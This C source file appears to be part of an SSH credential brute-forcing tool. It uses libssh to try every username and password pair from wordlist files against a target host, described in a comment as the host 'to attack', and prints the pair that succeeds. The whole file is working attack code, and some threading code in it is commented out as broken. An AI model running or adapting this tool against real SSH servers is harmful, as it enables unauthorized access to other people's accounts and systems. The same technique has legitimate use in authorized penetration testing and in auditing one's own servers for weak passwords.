#include <stdlib.h>
#include <string.h>
#include <stdio.h>
#include "thing-ssh.h"
#include <libssh/libssh.h>
#include <pthread.h>

void ssh_main(char *usr, char *pass, FILE *usrFile, FILE *passFile);
int sshAttempt(char* destination, char* username, char* password, ssh_session my_ssh);
/* void sshOutput(int attemptStatus, ssh_session my_ssh);
struct Attempt {
    char* destination;
    char* username;
    char*password;
    ssh_session myssh;
};
typedef struct Attempt Attempt;
void* threadAttempt(Attempt attempt);
void sshConfig(Attempt attempt, char* destination, char* username, char* password, ssh_session myssh);
char* getDestination(Attempt attempt);
char* getUsername(Attempt attempt);
char* getPassword(Attempt attempt);
ssh_session getSession(Attempt attempt);*/


void ssh_main(char *usr, char *pass, FILE *usrFile, FILE *passFile) {
    if (usrFilename != NULL && passFilename != NULL) {
        while (fgets(usr, 256, usrFile) != NULL) {
            if(usr[strlen(usr)-1] == '\n') {
                usr[strlen(usr)-1] = '\0';
            }                
            while (fgets(pass, 256, passFile) != NULL) {
                ssh_session my_ssh = ssh_new();
                // Replace new line with null to mark end of password
                if(pass[strlen(pass)-1] == '\n') {
                    pass[strlen(pass)-1] = '\0';
                }
                // if(threads > 0) {
                //     Attempt attempt;
                //     sshConfig(attempt, destination, usr, pass, my_ssh);
                //     pthread_t tID;
                //     // this doesn't work, can't check if it was a success or not, it also doesn't like the argument for some reason
                //     if(pthread_create(&tID, NULL, threadAttempt, &attempt) == SSH_AUTH_SUCCESS) {
                //         break;
                //     }
                // }
                if (sshAttempt(destination, usr, pass, my_ssh) == SSH_AUTH_SUCCESS) {
                    break;
                }   
            }
            //pthread_join;
            rewind(passFile);
        }
        fclose(usrFile);
        fclose(passFile);
    } else if (usrFilename != NULL) {

        while (fgets(usr, 256, usrFile) != NULL) {
            ssh_session my_ssh = ssh_new();
            if(usr[strlen(usr)-1] == '\n') {
                usr[strlen(usr)-1] = '\0';
            }
            sshAttempt(destination, usr, pass, my_ssh);   
        }
        fclose(usrFile);
    } else if (passFilename != NULL) {

        while (fgets(pass, 256, passFile) != NULL) {
            ssh_session my_ssh = ssh_new();
            if(pass[strlen(pass)-1] == '\n') {
                pass[strlen(pass)-1] = '\0';
            }            
            if (sshAttempt(destination, usr, pass, my_ssh) == SSH_AUTH_SUCCESS) {
                break;
            }  
        }
        fclose(passFile);
    } else {
        ssh_session my_ssh = ssh_new();
        sshAttempt(destination, usr, pass, my_ssh);   
    }
    return;
}

/*
Input:
    - destination: IP address or hostname to attack
    - username and password for SSH login
    - my_ssh handler
Output: int attemptStatus. Tells whether the auth is sucessful.
*/
int sshAttempt(char* destination, char* usr, char* pass, ssh_session my_ssh) {
    //Configure the options before making an SSH connection
    ssh_options_set(my_ssh, SSH_OPTIONS_HOST, destination);
    ssh_options_set(my_ssh, SSH_OPTIONS_PORT, &port);
    ssh_options_set(my_ssh, SSH_OPTIONS_USER, usr);
    
    //Connect to SSH server
    int rc = ssh_connect(my_ssh);
    if (rc != SSH_OK) {
        fprintf(stderr, "Error connecting to host: %s\n",
            ssh_get_error(my_ssh));
        ssh_free(my_ssh);
        exit(-1);
    }

    //printf("Successful connection\n");
    //printf("User:%s, Pass:%s\n", usr, pass);
    int attemptStatus = ssh_userauth_password(my_ssh, NULL, pass);
    sshOutput(attemptStatus, my_ssh, usr, pass);
    ssh_disconnect(my_ssh);
    ssh_free(my_ssh);
    return attemptStatus;
}

/*void* threadAttempt(Attempt attempt) {
    char* destination = getDestination(attempt);
    char* username = getUsername(attempt);
    char* password = getPassword(attempt);
    ssh_session my_ssh = getSession(attempt);
    //Configure the options before making an SSH connection
    ssh_options_set(my_ssh, SSH_OPTIONS_HOST, destination);
    ssh_options_set(my_ssh, SSH_OPTIONS_PORT, &port);
    ssh_options_set(my_ssh, SSH_OPTIONS_USER, usr);
    
    //Connect to SSH server
    int rc = ssh_connect(my_ssh);
    if (rc != SSH_OK) {
        fprintf(stderr, "Error connecting to host: %s\n",
            ssh_get_error(my_ssh));
        ssh_free(my_ssh);
        exit(-1);
    }

    //printf("Successful connection\n");
    //printf("User:%s, Pass:%s\n", usr, pass);
    int attemptStatus = ssh_userauth_password(my_ssh, NULL, pass);
    sshOutput(attemptStatus, my_ssh);
    ssh_disconnect(my_ssh);
    ssh_free(my_ssh);
    pthread_exit(attemptStatus);
}*/

void sshOutput(int attemptStatus, ssh_session my_ssh, char *usr, char *pass) {
    if (attemptStatus == SSH_AUTH_SUCCESS) {
        printf("\033[0;32mAuthentication successful:\033[0m || Destination:%s || Username:%s || Password:%s\n", destination, usr, pass);
    } else if(attemptStatus == SSH_AUTH_DENIED) {
        printf("\033[0;31mAuthentication failure:\033[0m Username:%s, Password:%s\n", usr, pass);
    } else {
        fprintf(stderr, "Error authenticating with password: %s\n",
        ssh_get_error(my_ssh));
    }
    return;
}

/*void sshConfig(Attempt attempt, char* destination, char* username, char* password, ssh_session myssh) {
    attempt.destination = destination;
    attempt.username = username;
    attempt.password = password;
    attempt.myssh = myssh;
}

char* getDestination(Attempt attempt) {
    return attempt.destination;
}

char* getUsername(Attempt attempt) {
    return attempt.username;
}

char* getPassword(Attempt attempt) {
    return attempt.password;
}

ssh_session getSession(Attempt attempt) {
    return attempt.myssh;
}*/